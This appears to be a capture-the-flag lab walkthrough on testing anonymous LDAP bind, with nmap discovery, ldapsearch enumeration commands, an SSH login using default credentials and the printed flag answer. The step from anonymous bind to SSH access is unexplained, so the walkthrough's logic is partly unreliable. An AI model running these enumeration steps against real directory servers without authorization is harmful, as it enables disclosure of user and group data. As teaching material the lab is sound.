# Lab 7.2: LDAP Anonymous Bind Test
## Learning Objectives
- Test anonymous LDAP bind
- Understand LDAP authentication
- Capture the flag
## Solution Walkthrough

### Step 1: Obtain Target IP Address

Get the target IP address from the lab platform before testing LDAP bind.

**Detailed Steps:**

1. **Discover the target IP:**
   - The lab panel shows your network subnet (e.g., `10.X.Y.0/24`)
   - Scan the subnet to find live hosts: `nmap -sn <subnet>`
   - The target will be one of the discovered hosts

2. **Verify network connectivity:**
   ```bash
   ping -c 3 <target_ip>
   ```

3. **Verify LDAP service is running:**
   ```bash
   nmap -p 389,636 <target_ip>
   ```

### Step 2: Test Anonymous Bind

Test if LDAP allows anonymous bind (connection without credentials).

**Detailed Steps:**

1. **Verify ldapsearch is installed:**
   ```bash
   which ldapsearch
   ```

2. **Test anonymous LDAP bind:**
   ```bash
   ldapsearch -x -H ldap://<target_ip> -b "" -s base
   ```
   
   Replace `<target_ip>` with your actual target IP (e.g., `ldapsearch -x -H ldap://<target_ip> -b "" -s base`)

   **Command breakdown:**
   - `ldapsearch`: LDAP search tool
   - `-x`: Simple authentication (anonymous bind)
   - `-H ldap://<target_ip>`: LDAP server URL (unencrypted)
   - `-b ""`: Base DN (empty = root)
   - `-s base`: Search scope (base level only)

3. **Expected output if anonymous bind succeeds:**
   ```
   # extended LDIF
   #
   # LDAPv3
   # base <> with scope baseObject
   # filter: (objectclass=*)
   # requesting: ALL
   #
   
   #
   dn:
   objectClass: top
   objectClass: domain
   dc: example
   ...
   
   # search result
   search: 2
   result: 0 Success
   
   # numResponses: 2
   ```

4. **Expected output if anonymous bind fails:**
   ```
   ldap_bind: Invalid credentials (49)
   ```

5. **Alternative: Test with verbose output:**
   ```bash
   ldapsearch -x -H ldap://<target_ip> -b "" -s base -v
   ```

### Step 3: Verify Bind

Confirm that anonymous bind was successful and you can query LDAP.

**Detailed Steps:**

1. **If bind was successful:**
   - You received LDAP data in the output
   - No "Invalid credentials" error
   - You can now query LDAP directory

2. **Test querying LDAP:**
   ```bash
   ldapsearch -x -H ldap://<target_ip> -b "dc=example,dc=com" "(objectClass=*)"
   ```

3. **What anonymous bind allows:**
   - Query directory structure
   - Enumerate users and groups
   - Access public directory information
   - No authentication required

4. **Security implications:**
   - Anonymous bind is a security risk
   - Allows information disclosure
   - Enables user enumeration
   - Should be disabled in production

### Step 4: Access Flag

The flag is located in /tmp/flag.txt on the LDAP server.

**Detailed Steps:**

1. **If you have shell access:**
   ```bash
   ssh admin@<target_ip>
   # Password: password
   ```

2. **Navigate to flag location:**
   ```bash
   cat /tmp/flag.txt
   ```

3. **Expected flag content:**
   ```
   OCR{ldap_4n0n_b1nd}
   ```

4. **Alternative: Check if flag is in LDAP directory:**
   ```bash
   ldapsearch -x -H ldap://<target_ip> -b "dc=example,dc=com" "(cn=flag)" | grep -i "flag"
   ```

5. **Verify file exists:**
   ```bash
   ls -la /tmp/flag.txt
   ```

### Step 5: Verify Flag Format

Ensure the flag is in the correct format before submission.

**Flag format:**
```
OCR{ldap_4n0n_b1nd}
```

**Verification checklist:**
- ✅ Starts with `OCR{`
- ✅ Ends with `}`
- ✅ Contains only alphanumeric characters and underscores
- ✅ No extra spaces or characters

**Success Criteria:**
- ✅ Verified target IP and LDAP service accessibility
- ✅ Tested anonymous LDAP bind using ldapsearch
- ✅ Verified anonymous bind was successful
- ✅ Understood security implications of anonymous bind
- ✅ Successfully accessed flag in /tmp/flag.txt
- ✅ Verified flag format is correct: `OCR{...}`

**Key Learning Points:**
- Anonymous bind allows LDAP access without credentials
- Testing anonymous bind reveals security misconfigurations
- Successful anonymous bind enables directory enumeration
- Understanding LDAP authentication is essential
- Anonymous bind should be disabled in production environments
## Hints
1. Use ldapsearch -x for anonymous
2. -b "" for base DN
3. Flag accessible after bind